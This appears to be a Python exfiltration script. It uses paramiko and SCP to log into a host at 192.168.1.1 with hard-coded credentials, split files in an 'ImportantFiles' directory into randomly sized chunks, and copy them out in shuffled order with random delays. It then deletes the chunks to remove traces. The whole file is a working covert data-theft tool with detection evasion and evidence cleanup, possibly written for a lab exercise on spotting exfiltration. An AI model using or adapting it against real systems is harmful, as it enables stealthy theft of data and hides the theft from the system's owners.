from paramiko import SSHClient
from scp import SCPClient
import sys
import random
import time

# Define progress callback that prints the current percentage completed for the file
def progress(filename, size, sent):
    sys.stdout.write("%s's progress: %.2f%%   \r" % (filename, float(sent)/float(size)*100) )


#Create SSH client
ssh = SSHClient()
ssh.load_system_host_keys()

print("Im splitting the file")
#Split file in chunks
ssh.connect('192.168.1.1', username="labcom", password="labcom")
stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 10K 50KB newfile; ls -l')
s = str(stdout.read())
print(s)
ssh.close()


numFiles = s.count("newfile")
#Add filename to array
files2copy = []
for i in range(0, numFiles):
    files2copy.append("newfilea"+chr(97+i))
    print("Im coppying file "+str(files2copy[i]))


time.sleep(abs(random.gauss(6,3)))                #+- 3-10sec


i = random.randint(2,3)
files2copy.remove("newfileaa")
files2copy.remove("newfileab")

#Split two files into smaller chunks
if i == 2:
    #Split file in chunks
    ssh.connect('192.168.1.1', username="labcom", password="labcom")
    stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 4K newfileaa nf1; ls -l')
    s = str(stdout.read())
    numFiles = s.count("nf1")
    for i in range(0, numFiles):
        files2copy.append("nf1a"+chr(97+i))
    
    stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 5K newfileab nf2; ls -l')
    s = str(stdout.read())
    numFiles = s.count("nf2")
    for i in range(0, numFiles):
        files2copy.append("nf2a"+chr(97+i))
    ssh.close()
#Split 3 files into smaller chuncks
else:
    files2copy.remove("newfileac")
    ssh.connect('192.168.1.1', username="labcom", password="labcom")
    
    stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 2K newfileaa nf1; ls -l')
    s = str(stdout.read())
    numFiles = s.count("nf1")
    for i in range(0, numFiles):
        files2copy.append("nf1a"+chr(97+i))

    
    stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 6K newfileab nf2; ls -l')
    s = str(stdout.read())
    numFiles = s.count("nf2")
    for i in range(0, numFiles):
        files2copy.append("nf2a"+chr(97+i))

    stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; ls -l; split -b 7K newfileab nf3; ls -l')
    s = str(stdout.read())
    numFiles = s.count("nf3")
    for i in range(0, numFiles):
        files2copy.append("nf3a"+chr(97+i))
    
    ssh.close()
    

#Randomly organize the array so that files are copied in a random order
random.shuffle(files2copy)
for i in range(0, len(files2copy)):
    print(files2copy[i])


time.sleep(abs(random.gauss(6,3)))                #+- 3-10sec
#Copy chunks
for f in files2copy:
    #Open ssh connection
    ssh.connect('192.168.1.1', username="labcom", password="labcom")

    # SCPCLient takes a paramiko transport as an argument and progress callback to see status of the file
    scp = SCPClient(ssh.get_transport(), progress=progress)

    #Copy file from remote server
    scp.get('/home/labcom/Project/ImportantFiles/'+f)
    
    #Close the scp connection
    scp.close()

    #Close the ssh connection
    ssh.close()

    #Random Delay
    time.sleep(abs(random.gauss(90,75)))                #+- 0-3 min



#Delete traces of the chunks
ssh.connect('192.168.1.1', username="labcom", password="labcom")
stdin, stdout, stderr = ssh.exec_command('cd Project/ImportantFiles; rm -rf newfile*; rm -rf nf*; ls -l')
s = str(stdout.read())
print(s)
ssh.close()